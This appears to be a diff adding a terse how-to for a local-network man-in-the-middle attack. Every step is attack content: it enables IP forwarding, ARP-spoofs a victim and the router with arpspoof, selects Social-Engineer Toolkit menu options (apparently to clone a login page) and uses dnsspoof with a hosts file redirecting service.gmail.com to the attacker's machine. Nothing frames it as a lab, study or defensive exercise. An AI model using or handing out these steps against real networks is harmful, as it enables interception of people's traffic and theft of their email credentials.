@@ -1,0 +1,22 @@
+1) configeration:::::
+         :::in terminal:::
+                echo 1 > /proc/sys/net/ipv4/ip_forward
+
+2) arpspoofing ::::::
+          :::in terminal:::
+                 a)arpspoof -i wlan0 -t IP_of_victim IP_of_router
+                 b)arpspoof -i wlan0 -t IP_of_router IP_of_victim
+
+3) setoolkit:::::
+       choose options --->>>  1 -> 2 -> 3 -> 2
+                           # now give your local ip address
+                        
+
+4) DNS Spoofing::::
+         :::in terminal:::
+                a)  pico hosts.txt
+                b) in pico.txt we place the address to our local machine and the search keywords::::
+                     ex::::     192.168.1.34 service.gmail.com
+         :::in terminal:::
+                 a) dnsspoof -i wlan0 -f hosts.txt
+
